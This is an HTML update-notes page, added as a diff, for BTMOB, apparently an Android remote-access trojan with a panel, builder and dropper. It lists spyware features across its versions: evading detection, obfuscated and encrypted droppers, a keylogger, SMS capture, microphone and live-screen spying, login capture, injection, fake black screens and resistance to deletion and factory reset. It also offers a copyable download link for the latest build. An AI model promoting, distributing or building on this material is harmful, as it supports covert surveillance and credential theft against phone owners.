@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BTMOB Update Notes</title>
+    <style>
+        *::-webkit-scrollbar {
+            width: 5px;
+        }
+
+        *::-webkit-scrollbar-track {
+            background: transparent;
+            border-radius: 15px;
+            margin: 30px;
+        }
+
+        *::-webkit-scrollbar-thumb {
+            background: #1E88E5;
+            border-radius: 15px;
+        }
+
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #0F0F0F;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .changelog {
+            padding: 20px;
+        }
+
+        h1 {
+            margin-left: 10px;
+            color: #1E88E5;
+            font-size: 2rem;
+        }
+
+        .update {
+            margin-bottom: 25px;
+            padding: 15px;
+            background: #2a2a2a;
+            border-left: 4px solid #1E88E5;
+            border-radius: 8px;
+        }
+
+        .version {
+            font-weight: bold;
+            color: #1E88E5;
+            font-size: 1.2rem;
+        }
+
+        .important {
+            color: #ff4444;
+            font-weight: bold;
+        }
+
+        .titlebrg {
+            color: #1E88E5;
+            font-weight: bold;
+            font-size: 1.4rem;
+        }
+
+        ul {
+            margin: 10px 0;
+            padding-left: 20px;
+        }
+
+        li {
+            margin: 8px 0;
+        }
+
+        .manul-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .input-wrapper {
+            opacity: 0;
+            transform: scale(0.95);
+            height: 0;
+            pointer-events: none;
+            transition: all 0.4s ease;
+            overflow: hidden;
+        }
+
+        .input-wrapper.show {
+            opacity: 1;
+            transform: scale(1);
+            height: auto;
+            pointer-events: auto;
+        }
+
+        .input-row {
+            display: flex;
+            width: 100%;
+            max-width: 650px;
+            gap: 10px;
+        }
+
+        .input-row input {
+            flex: 1;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid #00b4ff;
+            border-radius: 8px;
+            color: #fff;
+            backdrop-filter: blur(15px);
+            box-shadow: 0 0 8px rgba(0, 180, 255, 0.5);
+        }
+
+        .input-row input:focus {
+            outline: none;
+            box-shadow: 0 0 15px #00b4ff;
+        }
+
+        button {
+            padding: 10px 16px;
+            background: transparent;
+            border: 2px solid #00b4ff;
+            border-radius: 8px;
+            color: #00b4ff;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #00b4ff;
+            color: #000;
+        }
+
+        .copy-btn {
+            padding: 10px 20px;
+            min-width: 90px;
+        }
+
+        .hint {
+            font-size: 14px;
+            color: #aaa;
+            font-style: italic;
+        }
+
+        @media (max-width: 600px) {
+            .input-row {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+
+<body onselectstart="return false;" ondragstart="return false;" oncontextmenu="return false;">
+    <div class="changelog">
+        <h1>BTMOB Updates</h1>
+
+        <div class="update">
+            <p class="version">Version V3.6.3 | 27 November 2025</p>
+            <div class="manul-box">
+                <button onclick="toggleInput()" id="toggleBtn">Manual Update V3.6.3</button>
+                <div id="inputWrapper" class="input-wrapper">
+                    <div class="input-row">
+                        <input id="manuallink" type="text" value="https://limewire.com/d/8DVOw#TtZsEUQ6Ev" readonly="" />
+                        <button class="copy-btn" onclick="copyLink()">Copy</button>
+                    </div>
+                </div>
+            </div>
+            <ul>
+                <li>Improved overall connection stability and auto-reconnect system</li>
+                <li>Enhanced anti-detection mechanisms for Android 14 & 15</li>
+                <li>Bots Manager: faster execution and lower memory usage</li>
+                <li>Clone Manager: fixed issues on latest Android 15 builds</li>
+                <li>New Dropper obfuscation layer</li>
+                <li>Microphone recording quality and stability improved</li>
+                <li>Dynamic permission handling for new Samsung OneUI versions</li>
+                <li>Live screen lag fixed on high-resolution devices</li>
+                <li>APK & Dropper encryption upgraded</li>
+                <li>Multiple minor bug fixes and performance optimizations</li>
+                <p class="important">This update is for APK + Dropper only. Panel (EXE) unchanged.</p>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version V3.6.2 | Patch-Update | 30 August 2025</p>
+            <ul>
+                <li>Bug fixes and performance Improvements</li>
+                <li>Dropper + Main app now use the same loading page</li>
+                <li>Main interface only appears after all permissions granted</li>
+                <li>Microphone stability improved</li>
+                <p class="important">APK + Dropper only. No EXE update.</p>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version V3.6 | 23 August 2025</p>
+            <ul>
+                <li class="titlebrg">Bots Manager</li>
+                <ul>
+                    <li>Full mobile automation system</li>
+                    <li>Actions: Click (text/ID/class/XY), Scroll, Navigation, Sleep, Open App/Link, Paste Text, Wait, Stealth Mode, Toggle</li>
+                    <li>Duplicate, reorder, save/load, copy/paste bots, multi-client execution</li>
+                    <li>Real-time status tracking</li>
+                    <li>Android Viewer (ADB) - inspect elements for bot creation</li>
+                </ul>
+                <li class="titlebrg">Clone Manager</li>
+                <ul>
+                    <li>Full app cloning (isolated instances)</li>
+                    <li>Supports system and user apps</li>
+                    <li>Anti-delete clone protection</li>
+                </ul>
+                <li class="titlebrg">Dropper Rework</li>
+                <ul>
+                    <li>Unified loading flow with main app</li>
+                    <li>Re-enabled anti-delete</li>
+                    <li>Manages cloning and communication</li>
+                </ul>
+                <li class="titlebrg">Bypass Accessibility Detection V2</li>
+                <ul>
+                    <li>Works with all applications</li>
+                </ul>
+                <li class="titlebrg">Other Improvements</li>
+                <ul>
+                    <li>Stronger APK & Dropper encryption</li>
+                    <li>File manager auto-thumbnails</li>
+                    <li>Enhanced hide permission tool</li>
+                    <li>Fixed 6h timeout, SMS saving, offline keylogger, slow search, etc.</li>
+                </ul>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version V3.5 | Fix | 19 July 2025</p>
+            <ul>
+                <li>Fix builder issue</li>
+                <li>Fix dropper issue</li>
+                <li>Fix google play warnings</li>
+                <li>More stable APP</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version V3.5 | 10 July 2025</p>
+            <ul>
+                <li class="titlebrg">Bypass Access Detection</li>
+                <ul>
+                    <li>New builder option: Hide Accessibility - Add App ID</li>
+                    <li>Tips: use exact package name, wait 15-30 min after install, target app must be installed first</li>
+                </ul>
+                <li class="titlebrg">Builder Options</li>
+                <ul>
+                    <li>Protect APK</li>
+                    <li>Pump APK Size</li>
+                    <li>Inject JavaScript</li>
+                    <li>Force Permissions</li>
+                    <li>App Tag field</li>
+                </ul>
+                <li class="titlebrg">Panel Features</li>
+                <ul>
+                    <li>Enable/disable Anti-Delete</li>
+                    <li>Shortcut Tools on main panel</li>
+                </ul>
+                <li class="titlebrg">New Tools</li>
+                <ul>
+                    <li>Show Toast, Open Link, Text-to-Speech, Call Phone, Call Forwarding, Flashlight, Ads Blocker, Fast Download (FFmpeg)</li>
+                </ul>
+                <li class="titlebrg">Update Manager, SMS Manager improvements, Dark Theme back, etc.</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version V3.4.1 | 26 May 2025</p>
+            <ul>
+                <li>General improvements and bug fixes</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version V3.4 | 22 May 2025</p>
+            <ul>
+                <li class="titlebrg">Live Screen</li>
+                <ul>
+                    <li>Long press, recording, speed improvements</li>
+                </ul>
+                <li class="titlebrg">APK Improvements</li>
+                <ul>
+                    <li>Size ~8MB, new encryption, anti-delete, etc.</li>
+                </ul>
+                <li class="titlebrg">Black Screen Modes</li>
+                <ul>
+                    <li>Normal, System Update, Device Locked, Battery Died</li>
+                </ul>
+                <li class="titlebrg">Injection Lab, Saved Login Info, General enhancements</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version V3.3 | 24 April 2025</p>
+            <ul>
+                <li>Improved anti-delete and anti-reset accessibility</li>
+                <li>Enhanced APK stability</li>
+                <li>New languages for accessibility page</li>
+                <li>New signature & encryption</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">APK UPDATE V3.2.1 | 15 April 2025</p>
+            <ul>
+                <li>General Apk optimization</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version 3.2 | 13 April 2025</p>
+            <ul>
+                <li>Live location, new encryption, connection key, dropper updates, etc.</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version 3 Fix | 30 March 2025</p>
+            <ul>
+                <li>Fix crash after restart, live screen issues</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version 3.0 | 27 March 2025</p>
+            <ul>
+                <li>Auto updates, Android 14/15 full support, new encryption, etc.</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version 2.9</p>
+            <ul>
+                <li>Android 15 support, anti-factory reset, black screen permissions, etc.</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version 2.7</p>
+            <ul>
+                <li>Videos, panel features, sensors, fixes</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version 2.5.5</p>
+            <ul>
+                <li>Dropper encryption update, auto-install & hide</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version 2.5.2</p>
+            <ul>
+                <li>Server fixes, global servers</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">Version 2.5</p>
+            <ul>
+                <li>Android 14 SDK, removed sticky notification, HTML injection, etc.</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">BTMOB V2 Release</p>
+            <ul>
+                <li>Multi-threaded, dark theme, new file manager, lock screen, etc.</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">BTMOB Update 1.7</p>
+            <ul>
+                <li>Lock Screen tool, videos</li>
+            </ul>
+        </div>
+
+        <div class="update">
+            <p class="version">BTMOB Initial Features</p>
+            <ul>
+                <li>No port/VPN, full remote control, all core tools listed</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        function toggleInput() {
+            const wrapper = document.getElementById("inputWrapper");
+            const btn = document.getElementById("toggleBtn");
+            wrapper.classList.toggle("show");
+            btn.textContent = wrapper.classList.contains("show") ? "Hide Link" : "Manual Update V3.6.3";
+        }
+
+        function copyLink() {
+            const input = document.getElementById("manuallink");
+            input.select();
+            input.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(input.value).then(() => {
+                const btn = document.querySelector(".copy-btn");
+                btn.textContent = "Copied!";
+                setTimeout(() => btn.textContent = "Copy", 1500);
+            });
+        }
+    </script>
+
+</body>
+
+</html>
